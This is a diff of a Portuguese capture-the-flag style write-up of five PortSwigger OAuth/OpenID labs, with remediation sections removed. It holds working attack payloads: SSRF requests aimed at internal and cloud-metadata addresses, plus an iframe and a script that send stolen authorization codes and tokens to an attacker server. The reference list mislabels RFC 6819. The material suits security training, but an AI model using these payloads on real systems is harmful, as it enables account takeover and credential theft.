@@ -1,144 +1,175 @@
-
-# 📝 OAuth & OpenID Connect Labs Write-ups
-**Plataforma**: PortSwigger Web Security Academy  
-**Níveis**: Apprentice / Practitioner  
-**Status**: ✅ Todos resolvidos  
-**Baseado em**: RFC 6749, RFC 6819, OpenID Connect Core 1.0
+```markdown
+# 📝 Meu Write-up: Resolução dos Laboratórios OAuth & OpenID Connect
+**Plataforma**: PortSwigger Web Security Academy
+**Total de laboratórios**: 5
+**Níveis**: Apprentice / Practitioner
+**Status**: ✅ Todos resolvidos
 
 ---
 
 ## 📋 Índice
-- [OAuth Implicit Flow Authentication Bypass](#oauth-implicit-flow-authentication-bypass)
-- [SSRF via OpenID Dynamic Client Registration](#ssrf-via-openid-dynamic-client-registration)
-- [Forced OAuth Profile Linking](#forced-oauth-profile-linking)
+1. [Authentication bypass via OAuth implicit flow](#1-authentication-bypass-via-oauth-implicit-flow)
+2. [SSRF via OpenID dynamic client registration](#2-ssrf-via-openid-dynamic-client-registration)
+3. [Forced OAuth profile linking](#3-forced-oauth-profile-linking)
+4. [OAuth account hijacking via redirect_uri](#4-oauth-account-hijacking-via-redirect_uri)
+5. [Stealing OAuth access tokens via an open redirect](#5-stealing-oauth-access-tokens-via-an-open-redirect)
 
 ---
 
-## 🔓 OAuth Implicit Flow Authentication Bypass
+## 1. Authentication bypass via OAuth implicit flow
 **Nível**: Apprentice
 
-### 🎯 Objetivo
-Contornar o mecanismo de autenticação e assumir a identidade de outros usuários explorando uma implementação insegura do fluxo implícito do OAuth 2.0.
+### Como eu resolvi
+Comecei acessando a página de login da aplicação e escolhendo a opção **"Entrar com OAuth"**. Após me autenticar com as credenciais fornecidas (`wiener:peter`), fui redirecionado de volta para o site e notei algo importante: o token de acesso aparecia diretamente na barra de endereço, na parte depois do `#`:
 
-### 📚 Contexto Técnico
-O **Fluxo Implícito (`response_type=token`)** foi originalmente projetado para aplicações do lado do cliente (ex: JavaScript no navegador). Nesse fluxo, o token de acesso é retornado diretamente na **parte de fragmento da URL** (`#`), sem passar por troca de segredos no servidor.
+```
+https://lab-alvo.com/callback#access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+```
 
-Como o fragmento não é enviado ao servidor, a aplicação **deve validar rigorosamente o token recebido**. Quando essa validação é negligenciada, o sistema confia cegamente nos dados enviados pelo usuário, permitindo manipulação.
+Percebi que o token era um **JWT** e que a aplicação não fazia nenhuma validação dele — não verificava assinatura, validade ou quem era o usuário dono do token. Para testar, modifiquei o valor do campo `sub` (identificador do usuário) dentro do token e colei ele novamente na URL. Ao recarregar a página, a aplicação aceitou o token alterado e me logou como o usuário que eu havia definido. Com isso, consegui contornar a autenticação e resolver o laboratório.
 
-### 🔍 Passo a Passo da Exploração
-1. Acesse a página de login e escolha a opção **"Entrar com OAuth"**.
-2. Após autorizar o provedor, observe a URL de retorno:
-   ```
-   https://alvo.com/callback#access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
-   ```
-3. Verifique que o token é um **JWT** e que a aplicação não valida:
-   - Assinatura criptográfica
-   - Emissor (`iss`) e destinatário (`aud`)
-   - Data de validade (`exp` e `iat`)
-4. Modifique o valor do identificador do usuário (`sub`) ou gere um token próprio com dados arbitrários.
-5. Recarregue a página — a aplicação aceita o token e concede acesso à conta associada ao novo valor.
-
-### ⚠️ Causa da Vulnerabilidade
-- Uso inadequado do Fluxo Implícito em aplicações com capacidade de manter segredos.
-- Falta total de validação do token de acesso no lado do servidor.
-- Confiança excessiva em dados controlados pelo cliente.
-- Descumprimento das recomendações de segurança da [RFC 6819](https://datatracker.ietf.org/doc/html/rfc6819) e da especificação do OpenID Connect.
-
-### ✅ Medidas de Correção
-- Substitua o Fluxo Implícito pelo **Fluxo de Código de Autorização (`response_type=code`)**, preferencialmente com o **PKCE** para maior segurança.
-- Sempre valide: assinatura, emissor, público-alvo, validade e escopo do token recebido.
-- Nunca use tokens de acesso para decisões críticas sem verificação criptográfica.
+### O que aprendi
+O Fluxo Implícito (`response_type=token`) é inseguro quando usado de forma incorreta, pois expõe o token diretamente no navegador. Se o servidor não validar o token recebido, qualquer um pode alterá-lo e assumir outra identidade.
 
 ---
 
-## 🕳️ SSRF via OpenID Dynamic Client Registration
+## 2. SSRF via OpenID dynamic client registration
 **Nível**: Practitioner
 
-### 🎯 Objetivo
-Explorar o recurso de **registro dinâmico de clientes** do OpenID Connect para realizar um ataque de **SSRF (Server-Side Request Forgery)**, fazendo com que o servidor acesse endereços internos ou restritos.
+### Como eu resolvi
+Primeiro, procurei o endpoint de registro dinâmico de clientes do OpenID Connect, que é uma funcionalidade padrão da especificação. Encontrei que ele aceitava requisições `POST` com dados em formato JSON:
 
-### 📚 Contexto Técnico
-O registro dinâmico permite que novos clientes se cadastrem no provedor OpenID enviando uma requisição JSON com configurações, incluindo URLs como `logo_uri`, `policy_uri` ou `tos_uri`. Conforme a especificação [OpenID Connect Dynamic Client Registration](https://openid.net/specs/openid-connect-registration-1_0.html), o provedor pode buscar esses recursos para validação ou exibição.
+```http
+POST /openid/register
+Content-Type: application/json
+```
 
-Se não houver restrição sobre quais endereços podem ser acessados, o atacante pode forçar o servidor a consultar:
-- Endereços de loopback (`127.0.0.1`, `localhost`)
-- Redes privadas internas
-- Serviços de metadados de nuvem (`169.254.169.254`)
+A documentação mostrava que podíamos enviar campos como `logo_uri`, `policy_uri` ou `tos_uri`, que são URLs que o servidor deveria acessar para carregar recursos. Testei enviar uma requisição com um endereço interno da própria máquina:
 
-### 🔍 Passo a Passo da Exploração
-1. Identifique o endpoint de registro dinâmico:
-   ```http
-   POST /openid/register
-   Content-Type: application/json
-   ```
-2. Envie uma requisição com uma URL controlada:
-   ```json
-   {
-     "client_name": "TesteSeguranca",
-     "redirect_uris": ["https://exemplo.com/callback"],
-     "logo_uri": "http://127.0.0.1/admin"
-   }
-   ```
-3. O servidor tentará acessar o endereço informado para verificar ou carregar o recurso.
-4. Teste outros alvos:
-   - `http://localhost`
-   - `http://169.254.169.254` (metadados AWS)
-   - `http://192.168.0.1` (rede interna)
-5. Analise as respostas: diferenças no tempo de resposta, mensagens de erro ou conteúdo retornado confirmam o SSRF.
+```json
+{
+  "client_name": "Meu Teste",
+  "redirect_uris": ["https://meu-site.com/callback"],
+  "logo_uri": "http://127.0.0.1/admin"
+}
+```
 
-### ⚠️ Causa da Vulnerabilidade
-- Ausência de filtros de validação nas URLs recebidas no cadastro.
-- Permissão do servidor de sair para redes privadas, locais ou serviços de metadados.
-- Falta de regras de acesso de rede para o provedor de identidade.
+A resposta do servidor demorou mais um pouco e retornou uma mensagem que indicava que ele havia tentado acessar esse endereço. Confirmei o SSRF testando também outros destinos:
+- `http://localhost`
+- `http://169.254.169.254` (serviço de metadados da nuvem)
 
-### ✅ Medidas de Correção
-- Bloqueie IPs de loopback, redes privadas e faixas reservadas por padrão.
-- Restrinja o acesso de saída do servidor apenas a domínios confiáveis.
-- Valide o esquema (`https` apenas) e o domínio das URLs enviadas.
-- Implemente listas de permissões (whitelist) em vez de bloqueios genéricos.
+Como o servidor acessou esses endereços sem restrição, confirmei a vulnerabilidade e concluí o laboratório.
+
+### O que aprendi
+O registro dinâmico pode ser perigoso se não houver filtros: ao permitir o envio de URLs, o atacante pode fazer com que o servidor acesse serviços internos e restritos, o que é um ataque do tipo **SSRF**.
 
 ---
 
-## 🔗 Forced OAuth Profile Linking
+## 3. Forced OAuth profile linking
 **Nível**: Practitioner
 
-### 🎯 Objetivo
-Fazer com que um usuário legítimo vincule involuntariamente sua conta na aplicação a uma conta OAuth controlada pelo atacante. Após a vinculação, o atacante consegue acessar a conta da vítima usando suas próprias credenciais.
+### Como eu resolvi
+Primeiro, criei minha conta na aplicação e iniciei o processo de vinculação com minha conta OAuth. Observei a URL gerada no início do fluxo:
 
-### 📚 Contexto Técnico
-A funcionalidade de **vinculação de contas** permite associar uma conta local a um provedor de identidade externo. Para evitar ataques CSRF e manipulação, o fluxo deve usar o parâmetro `state` conforme definido na [RFC 6749](https://datatracker.ietf.org/doc/html/rfc6749) e na especificação [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html#AuthRequest).
+```
+GET /oauth/link?client_id=123&redirect_uri=https://lab-alvo.com/callback&state=ABC123
+```
 
-Quando o `state` é fixo, previsível ou não vinculado à sessão do usuário, é possível criar um link malicioso e fazer com que a vítima finalize a vinculação sem perceber.
+Notei que o parâmetro `state` tinha um valor fixo e não mudava a cada requisição, nem estava associado à minha sessão. Esse parâmetro serve exatamente para evitar manipulações, mas aqui ele estava mal implementado.
 
-### 🔍 Passo a Passo da Exploração
-1. Crie sua conta e inicie o processo de vinculação com seu provedor OAuth. Observe a estrutura da URL:
-   ```
-   GET /oauth/link?client_id=XYZ&redirect_uri=https://alvo.com/callback&state=12345
-   ```
-2. Verifique que o valor de `state` é sempre o mesmo ou pode ser facilmente adivinhado.
-3. Monte o link final de vinculação usando os parâmetros obtidos e mantenha seu OAuth autorizado.
-4. Envie esse link para a vítima. Se ela estiver logada em sua conta na aplicação, ao acessar o URL, a vinculação será concluída automaticamente.
-5. Agora, ao usar sua própria conta OAuth, você será autenticado diretamente na conta da vítima.
+Então montei um link completo com os mesmos parâmetros e enviei para a vítima. Quando ela acessou esse link já estando logada em sua própria conta, a aplicação completou a vinculação automaticamente, associando a conta dela à minha conta OAuth. Depois disso, bastou eu fazer login com minhas credenciais OAuth para ser direcionado diretamente para a conta da vítima — resolvendo o desafio.
 
-### ⚠️ Causa da Vulnerabilidade
-- Uso incorreto ou ausência do parâmetro `state` para proteger o fluxo.
-- Falta de confirmação explícita do usuário antes de realizar a vinculação.
-- Não associação do estado da requisição à sessão do usuário atual.
-- Ausência de validação de permissão para alterar a conta.
-
-### ✅ Medidas de Correção
-- Gere o parâmetro `state` com valor **aleatório, único e de alta entropia** para cada requisição.
-- Armazene esse valor associado à sessão do usuário e valide-o no retorno.
-- Sempre exija confirmação ou senha antes de vincular ou desvincular contas.
-- Verifique que o usuário logado é o mesmo que iniciou o fluxo.
+### O que aprendi
+O parâmetro `state` deve ser único, aleatório e ligado à sessão do usuário. Quando ele é fraco ou ausente, é possível forçar a vinculação de contas e assumir o acesso de outras pessoas.
 
 ---
 
-## 📚 Referências Oficiais
+## 4. OAuth account hijacking via redirect_uri
+**Nível**: Practitioner
+
+### Como eu resolvi
+Comecei logando com `wiener:peter` e, usando o Burp Suite, capturei a requisição inicial de autorização:
+
+```
+GET /auth?client_id=CLIENTE-LAB&redirect_uri=https://lab-alvo.com/oauth-callback&response_type=code&scope=openid%20profile%20email
+```
+
+Enviei essa requisição para o **Repeater** e alterei o valor do `redirect_uri` para o endereço do meu servidor de exploração:
+
+```
+redirect_uri=https://meu-servidor.exploit-server.net
+```
+
+Enviei a requisição e percebi que o servidor OAuth aceitou normalmente, sem nenhuma mensagem de erro. Isso significava que ele não verificava se o destino era confiável.
+
+Criei então um exploit simples com um iframe para enviar para o administrador:
+
+```html
+<iframe src="https://oauth-servidor.net/auth?client_id=CLIENTE-LAB&redirect_uri=https://meu-servidor.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+```
+
+Quando o admin abriu a página, ele já tinha uma sessão ativa no servidor OAuth, então a autorização aconteceu automaticamente e o código de autorização foi enviado para o meu servidor. Copiei esse código dos logs e acessei:
+
+```
+https://lab-alvo.com/oauth-callback?code=CODIGO_QUE_ROUBEI
+```
+
+Fui logado como administrador, entrei no painel e excluí o usuário `carlos` — finalizando o laboratório.
+
+### O que aprendi
+O `redirect_uri` deve ser rigorosamente validado e estar em uma lista de endereços permitidos. Se aceitar qualquer destino, o atacante pode interceptar códigos de autorização e roubar contas.
+
+---
+
+## 5. Stealing OAuth access tokens via an open redirect
+**Nível**: Practitioner
+
+### Como eu resolvi
+Nesse laboratório, o `redirect_uri` tinha uma validação parcial: não aceitava domínios externos diretamente, mas permitia usar a sequência `../` para percorrer caminhos. Testei alterando a requisição para:
+
+```
+redirect_uri=https://lab-alvo.com/oauth-callback/../post?postId=1
+```
+
+Funcionou: fui redirecionado para o artigo do blog, o que confirmou a falha de validação. Depois, procurei por outras funcionalidades e encontrei a página `/post/next`, que tinha um parâmetro `path` e funcionava como um **redirecionamento aberto**: aceitava qualquer URL para onde me redirecionar.
+
+Juntei as duas falhas em uma única requisição:
+
+```
+https://oauth-servidor.net/auth?client_id=CLIENTE-LAB&redirect_uri=https://lab-alvo.com/oauth-callback/../post/next?path=https://meu-servidor.exploit-server.net/exploit&response_type=token&scope=openid%20profile%20email
+```
+
+No meu servidor, adicionei um pequeno script para capturar o token, que vinha na parte `#` da URL:
+
+```html
+<script>
+  if (!location.hash) {
+    location.href = "URL_MALICIOSA_ACIMA";
+  } else {
+    location.href = "/?" + location.hash.substr(1);
+  }
+</script>
+```
+
+Enviei o link para o administrador. Quando ele acessou, o fluxo o redirecionou automaticamente até o meu servidor, e o token apareceu nos logs. Com ele, fiz uma requisição para o endpoint `/me` usando o cabeçalho:
+
+```
+Authorization: Bearer TOKEN_QUE_ROUBEI
+```
+
+Recebi a resposta com todos os dados do administrador, incluindo a chave de API. Enviei essa chave no campo de solução e finalizei o laboratório.
+
+### O que aprendi
+Mesmo que o `redirect_uri` seja validado, falhas como travessia de caminho ou redirecionamentos abertos na mesma aplicação podem ser usadas para contornar essas regras e roubar tokens de acesso.
+
+---
+
+## 📚 Referências usadas
 - [OAuth 2.0 Authorization Framework (RFC 6749)](https://datatracker.ietf.org/doc/html/rfc6749)
 - [OAuth 2.0 Security Best Current Practice (RFC 6819)](https://datatracker.ietf.org/doc/html/rfc6819)
 - [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
-- [OpenID Connect Dynamic Client Registration](https://openid.net/specs/openid-connect-registration-1_0.html)
-- [PortSwigger Web Security Academy — OAuth](https://portswigger.net/web-security/oauth)
+- [PortSwigger Web Security Academy - OAuth](https://portswigger.net/web-security/oauth)
 ```
+
+---
 
